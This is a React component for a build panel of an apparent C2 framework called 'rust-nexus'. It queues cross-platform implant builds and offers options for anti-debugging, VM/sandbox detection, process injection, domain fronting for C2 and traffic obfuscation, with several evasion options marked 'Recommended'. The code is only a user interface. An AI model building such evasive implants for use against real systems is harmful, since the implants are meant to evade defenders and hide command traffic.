import { useState } from "react";
import { Monitor, HardDrive, Cpu, Download, CheckCircle, XCircle, Clock } from "lucide-react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Checkbox } from "@/components/ui/checkbox";
import { Label } from "@/components/ui/label";
import { api } from "@/lib/api";
import { toast } from "sonner";

interface BuildConfig {
  platform: "windows" | "linux" | "macos";
  architecture: "x64" | "x86" | "arm64";
  features: string[];
}

interface BuildStatus {
  id: string;
  status: "pending" | "building" | "completed" | "failed";
  platform: string;
  architecture: string;
  binarySize?: number;
  buildDurationMs?: number;
  errorMessage?: string;
}

const PLATFORM_OPTIONS = [
  {
    value: "windows",
    label: "Windows",
    icon: Monitor,
    architectures: ["x64", "x86"],
    description: "Windows Desktop & Server"
  },
  {
    value: "linux",
    label: "Linux",
    icon: HardDrive,
    architectures: ["x64", "x86", "arm64"],
    description: "Linux Distributions"
  },
  {
    value: "macos",
    label: "macOS",
    icon: Monitor,
    architectures: ["x64", "arm64"],
    description: "Intel & Apple Silicon"
  },
];

const ARCHITECTURE_INFO = {
  x64: {
    label: "x64 (64-bit)",
    description: "Standard 64-bit processors",
    icon: Cpu,
  },
  x86: {
    label: "x86 (32-bit)",
    description: "Legacy 32-bit systems",
    icon: Cpu,
  },
  arm64: {
    label: "ARM64",
    description: "ARM-based processors (Raspberry Pi, Apple Silicon)",
    icon: Cpu,
  },
};

const AVAILABLE_FEATURES = [
  { name: "anti-debug", description: "Anti-debugging detection", recommended: true },
  { name: "anti-vm", description: "VM/sandbox detection", recommended: true },
  { name: "process-injection", description: "Process injection capabilities", recommended: false },
  { name: "domain-fronting", description: "Domain fronting for C2", recommended: false },
  { name: "http-fallback", description: "HTTP fallback communication", recommended: true },
  { name: "traffic-obfuscation", description: "Traffic obfuscation", recommended: true },
];

export default function MultiArchBuildPanel() {
  const [buildConfigs, setBuildConfigs] = useState<BuildConfig[]>([]);
  const [selectedPlatform, setSelectedPlatform] = useState<string>("linux");
  const [selectedArchitecture, setSelectedArchitecture] = useState<string>("x64");
  const [selectedFeatures, setSelectedFeatures] = useState<string[]>(["http-fallback"]);
  const [activeBuilds, setActiveBuilds] = useState<BuildStatus[]>([]);
  const [building, setBuilding] = useState(false);

  const selectedPlatformInfo = PLATFORM_OPTIONS.find(p => p.value === selectedPlatform);

  const handleAddBuildConfig = () => {
    const newConfig: BuildConfig = {
      platform: selectedPlatform as any,
      architecture: selectedArchitecture as any,
      features: [...selectedFeatures],
    };

    // Check for duplicates
    const isDuplicate = buildConfigs.some(
      c => c.platform === newConfig.platform && c.architecture === newConfig.architecture
    );

    if (isDuplicate) {
      toast.error("This platform/architecture combination is already added");
      return;
    }

    setBuildConfigs([...buildConfigs, newConfig]);
    toast.success("Build configuration added");
  };

  const handleRemoveBuildConfig = (index: number) => {
    const updated = buildConfigs.filter((_, i) => i !== index);
    setBuildConfigs(updated);
  };

  const handleToggleFeature = (feature: string) => {
    setSelectedFeatures(prev =>
      prev.includes(feature)
        ? prev.filter(f => f !== feature)
        : [...prev, feature]
    );
  };

  const handleBuildAll = async () => {
    if (buildConfigs.length === 0) {
      toast.error("Add at least one build configuration");
      return;
    }

    setBuilding(true);
    const builds: BuildStatus[] = [];

    try {
      // Trigger all builds
      for (const config of buildConfigs) {
        try {
          const response = await api.post<{ buildId: string }>("/rust-nexus/build", {
            platform: config.platform,
            architecture: config.architecture,
            features: config.features,
          });

          builds.push({
            id: response.buildId,
            status: "pending",
            platform: config.platform,
            architecture: config.architecture,
          });

          toast.success(`Build started: ${config.platform}/${config.architecture}`);
        } catch (error) {
          console.error("Failed to start build:", error);
          toast.error(`Failed to start ${config.platform}/${config.architecture} build`);
        }
      }

      setActiveBuilds(builds);

      // Poll for build status
      pollBuildStatus(builds.map(b => b.id));
    } catch (error) {
      console.error("Build error:", error);
      toast.error("Failed to start builds");
    } finally {
      setBuilding(false);
    }
  };

  const pollBuildStatus = async (buildIds: string[]) => {
    const pollInterval = setInterval(async () => {
      try {
        const updatedBuilds = await Promise.all(
          buildIds.map(async id => {
            const status = await api.get<BuildStatus>(`/rust-nexus/build/${id}/status`);
            return status;
          })
        );

        setActiveBuilds(updatedBuilds);

        // Stop polling if all builds are done
        const allDone = updatedBuilds.every(
          b => b.status === "completed" || b.status === "failed"
        );

        if (allDone) {
          clearInterval(pollInterval);

          const successful = updatedBuilds.filter(b => b.status === "completed").length;
          const failed = updatedBuilds.filter(b => b.status === "failed").length;

          toast.success(`Builds complete: ${successful} successful, ${failed} failed`);
        }
      } catch (error) {
        console.error("Failed to poll build status:", error);
        clearInterval(pollInterval);
      }
    }, 3000);

    // Cleanup after 10 minutes
    setTimeout(() => clearInterval(pollInterval), 600000);
  };

  const formatBytes = (bytes: number) => {
    if (bytes < 1024) return `${bytes} B`;
    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
    return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
  };

  const formatDuration = (ms: number) => {
    const seconds = Math.floor(ms / 1000);
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return minutes > 0 ? `${minutes}m ${remainingSeconds}s` : `${seconds}s`;
  };

  return (
    <div className="space-y-6">
      {/* Configuration Builder */}
      <Card className="p-6">
        <h3 className="text-lg font-semibold mb-4">Build Configuration</h3>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          {/* Platform Selection */}
          <div>
            <Label>Platform</Label>
            <Select value={selectedPlatform} onValueChange={setSelectedPlatform}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                {PLATFORM_OPTIONS.map(platform => (
                  <SelectItem key={platform.value} value={platform.value}>
                    <div className="flex items-center gap-2">
                      <platform.icon className="h-4 w-4" />
                      {platform.label}
                    </div>
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            {selectedPlatformInfo && (
              <p className="text-xs text-muted-foreground mt-1">
                {selectedPlatformInfo.description}
              </p>
            )}
          </div>

          {/* Architecture Selection */}
          <div>
            <Label>Architecture</Label>
            <Select value={selectedArchitecture} onValueChange={setSelectedArchitecture}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                {selectedPlatformInfo?.architectures.map(arch => (
                  <SelectItem key={arch} value={arch}>
                    {ARCHITECTURE_INFO[arch as keyof typeof ARCHITECTURE_INFO].label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            <p className="text-xs text-muted-foreground mt-1">
              {ARCHITECTURE_INFO[selectedArchitecture as keyof typeof ARCHITECTURE_INFO]?.description}
            </p>
          </div>
        </div>

        {/* Features */}
        <div className="mt-6">
          <Label className="mb-3 block">Features</Label>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
            {AVAILABLE_FEATURES.map(feature => (
              <div key={feature.name} className="flex items-start gap-2">
                <Checkbox
                  id={feature.name}
                  checked={selectedFeatures.includes(feature.name)}
                  onCheckedChange={() => handleToggleFeature(feature.name)}
                />
                <div className="flex-1">
                  <label
                    htmlFor={feature.name}
                    className="text-sm font-medium cursor-pointer flex items-center gap-2"
                  >
                    {feature.name}
                    {feature.recommended && (
                      <Badge variant="outline" className="text-xs">Recommended</Badge>
                    )}
                  </label>
                  <p className="text-xs text-muted-foreground">{feature.description}</p>
                </div>
              </div>
            ))}
          </div>
        </div>

        <Button onClick={handleAddBuildConfig} className="mt-6">
          Add to Build Queue
        </Button>
      </Card>

      {/* Build Queue */}
      {buildConfigs.length > 0 && (
        <Card className="p-6">
          <div className="flex items-center justify-between mb-4">
            <h3 className="text-lg font-semibold">Build Queue ({buildConfigs.length})</h3>
            <Button onClick={handleBuildAll} disabled={building}>
              {building ? "Building..." : "Build All"}
            </Button>
          </div>

          <div className="space-y-2">
            {buildConfigs.map((config, index) => (
              <div
                key={index}
                className="flex items-center justify-between p-3 bg-secondary rounded-lg"
              >
                <div className="flex items-center gap-3">
                  <Badge>{config.platform}</Badge>
                  <Badge variant="outline">{config.architecture}</Badge>
                  <span className="text-sm text-muted-foreground">
                    {config.features.length} features
                  </span>
                </div>
                <Button
                  size="sm"
                  variant="ghost"
                  onClick={() => handleRemoveBuildConfig(index)}
                >
                  Remove
                </Button>
              </div>
            ))}
          </div>
        </Card>
      )}

      {/* Active Builds */}
      {activeBuilds.length > 0 && (
        <Card className="p-6">
          <h3 className="text-lg font-semibold mb-4">Active Builds</h3>

          <div className="space-y-3">
            {activeBuilds.map(build => (
              <div
                key={build.id}
                className="flex items-center justify-between p-4 border border-border rounded-lg"
              >
                <div className="flex items-center gap-4">
                  {build.status === "completed" ? (
                    <CheckCircle className="h-5 w-5 text-green-600" />
                  ) : build.status === "failed" ? (
                    <XCircle className="h-5 w-5 text-red-600" />
                  ) : (
                    <Clock className="h-5 w-5 text-blue-600 animate-spin" />
                  )}

                  <div>
                    <div className="font-medium">
                      {build.platform}/{build.architecture}
                    </div>
                    <div className="text-sm text-muted-foreground">
                      {build.status === "completed" && build.binarySize && (
                        <span>Size: {formatBytes(build.binarySize)}</span>
                      )}
                      {build.status === "completed" && build.buildDurationMs && (
                        <span className="ml-3">
                          Built in {formatDuration(build.buildDurationMs)}
                        </span>
                      )}
                      {build.status === "failed" && build.errorMessage && (
                        <span className="text-red-600">{build.errorMessage}</span>
                      )}
                      {build.status === "building" && <span>Building...</span>}
                      {build.status === "pending" && <span>Queued</span>}
                    </div>
                  </div>
                </div>

                {build.status === "completed" && (
                  <Button size="sm" variant="outline">
                    <Download className="h-4 w-4 mr-2" />
                    Download
                  </Button>
                )}
              </div>
            ))}
          </div>
        </Card>
      )}
    </div>
  );
}
